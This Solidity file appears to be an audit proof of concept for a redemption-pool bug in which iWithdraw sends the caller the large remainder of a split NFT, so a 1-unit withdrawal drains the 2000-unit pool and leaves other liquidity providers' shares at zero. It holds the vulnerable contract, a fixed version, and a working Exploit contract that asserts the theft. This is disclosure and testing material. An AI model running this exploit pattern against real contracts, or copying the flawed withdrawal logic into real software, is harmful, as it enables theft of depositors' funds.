// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  STBL redemption — iWithdraw (Cyfrin, 2026-06-17)
    split() returns (A, B) where A.stableValueNet == amt and
    B.stableValueNet == pool - amt. iWithdraw sends B to the caller and keeps A.
    A 1-unit withdraw takes the 2000-unit remainder. The other LPs' shares floor
    to zero against a 1-unit pool, so they cannot withdraw.
*/

contract ValueToken {
    string public symbol = "USST";
    uint8 public constant decimals = 0;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract YLD {
    struct Meta {
        uint256 stableValueNet;
        address owner;
    }

    uint256 public nftCtr;
    mapping(uint256 => Meta) public data;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 value) external returns (uint256 id) {
        id = ++nftCtr;
        data[id] = Meta(value, to);
        balanceOf[to] += 1;
    }

    function ownerOf(uint256 id) external view returns (address) {
        return data[id].owner;
    }

    function getNFTData(uint256 id) external view returns (uint256 stableValueNet) {
        return data[id].stableValueNet;
    }

    function addValue(uint256 id, uint256 value) external {
        data[id].stableValueNet += value;
    }

    function burn(uint256 id) external {
        address owner = data[id].owner;
        balanceOf[owner] -= 1;
        delete data[id];
    }

    function transferFrom(address from, address to, uint256 id) external {
        require(data[id].owner == from, "owner");
        data[id].owner = to;
        balanceOf[from] -= 1;
        balanceOf[to] += 1;
    }

    function split(uint256 id, uint256 amt) external returns (uint256 tokenIdA, uint256 tokenIdB) {
        Meta memory m = data[id];
        require(m.owner == msg.sender, "owner");
        require(m.stableValueNet > amt, "split");
        uint256 rest = m.stableValueNet - amt;
        balanceOf[msg.sender] -= 1;
        delete data[id];
        tokenIdA = ++nftCtr;
        tokenIdB = ++nftCtr;
        data[tokenIdA] = Meta(amt, msg.sender);
        data[tokenIdB] = Meta(rest, msg.sender);
        balanceOf[msg.sender] += 2;
    }
}

contract Redemption {
    YLD public immutable yld;
    ValueToken public immutable value;
    uint256 public NFTID;
    uint256 public totalSupply;
    mapping(address => uint256) public stableValueNet;
    address public lp1;
    address public lp2;

    constructor(YLD _yld, ValueToken _value, address _lp1, address _lp2, uint256 poolValue) {
        yld = _yld;
        value = _value;
        lp1 = _lp1;
        lp2 = _lp2;
        NFTID = _yld.mint(address(this), poolValue);
        stableValueNet[_lp1] = poolValue / 2;
        stableValueNet[_lp2] = poolValue / 2;
        totalSupply = poolValue;
    }

    function iFetchShare(address lp) public view returns (uint256) {
        uint256 poolV = yld.getNFTData(NFTID);
        if (totalSupply == 0) return 0;
        return stableValueNet[lp] * poolV / totalSupply;
    }

    function deposit(uint256 id) external {
        uint256 v = yld.getNFTData(id);
        yld.transferFrom(msg.sender, address(this), id);
        value.transferFrom(msg.sender, address(this), v);
        yld.addValue(NFTID, v);
        yld.burn(id);
        stableValueNet[msg.sender] += v;
        totalSupply += v;
    }

    function withdraw(uint256 _amt) external {
        iWithdraw(_amt);
    }

    function iWithdraw(uint256 _amt) public {
        uint256 share = iFetchShare(msg.sender);
        require(_amt > 0 && _amt <= share, "STBL_InvalidAmount");
        stableValueNet[msg.sender] -= _amt;
        (uint256 _A, uint256 _B) = yld.split(NFTID, _amt);
        uint256 taken = yld.getNFTData(_B);
        // @> VULN: _B is the pool-minus-amt remainder and is transferred to the caller; the pool keeps the amt-sized _A
        yld.transferFrom(address(this), msg.sender, _B);
        NFTID = _A;
        require(value.transfer(msg.sender, taken), "pay");
    }
}

contract RedemptionFixed {
    YLD public immutable yld;
    ValueToken public immutable value;
    uint256 public NFTID;
    uint256 public totalSupply;
    mapping(address => uint256) public stableValueNet;

    constructor(YLD _yld, ValueToken _value, uint256 poolValue) {
        yld = _yld;
        value = _value;
        NFTID = _yld.mint(address(this), poolValue);
        totalSupply = poolValue;
    }

    function iFetchShare(address lp) public view returns (uint256) {
        uint256 poolV = yld.getNFTData(NFTID);
        if (totalSupply == 0) return 0;
        return stableValueNet[lp] * poolV / totalSupply;
    }

    function deposit(uint256 id) external {
        uint256 v = yld.getNFTData(id);
        yld.transferFrom(msg.sender, address(this), id);
        value.transferFrom(msg.sender, address(this), v);
        yld.addValue(NFTID, v);
        yld.burn(id);
        stableValueNet[msg.sender] += v;
        totalSupply += v;
    }

    function withdraw(uint256 _amt) external {
        uint256 share = iFetchShare(msg.sender);
        require(_amt > 0 && _amt <= share, "STBL_InvalidAmount");
        stableValueNet[msg.sender] -= _amt;
        totalSupply -= _amt;
        (uint256 _A, uint256 _B) = yld.split(NFTID, _amt);
        uint256 taken = yld.getNFTData(_A);
        yld.transferFrom(address(this), msg.sender, _A);
        NFTID = _B;
        require(value.transfer(msg.sender, taken), "pay");
    }
}

contract Exploit {
    address public constant LP1 = address(0xB0B);
    address public constant LP2 = address(0xCA1);
    ValueToken public value;
    YLD public yld;
    Redemption public redemption;
    uint256 public received;
    uint256 public poolLeft;
    uint256 public lp1Share;

    constructor() {
        value = new ValueToken();
        yld = new YLD();
        redemption = new Redemption(yld, value, LP1, LP2, 2000);
        value.mint(address(redemption), 2000);
        value.mint(address(this), 1);
    }

    function run() external {
        uint256 id = yld.mint(address(this), 1);
        value.approve(address(redemption), 1);
        redemption.deposit(id);
        redemption.withdraw(1);
        received = value.balanceOf(address(this));
        poolLeft = yld.getNFTData(redemption.NFTID());
        lp1Share = redemption.iFetchShare(LP1);
        require(received == 2000, "attacker took remainder");
        require(poolLeft == 1, "pool kept the 1-unit slice");
        require(lp1Share == 0, "lp1 share floors to zero");
        require(redemption.iFetchShare(LP2) == 0, "lp2 share floors to zero");
        require(value.balanceOf(address(redemption)) == 1, "pool value left");
    }
}
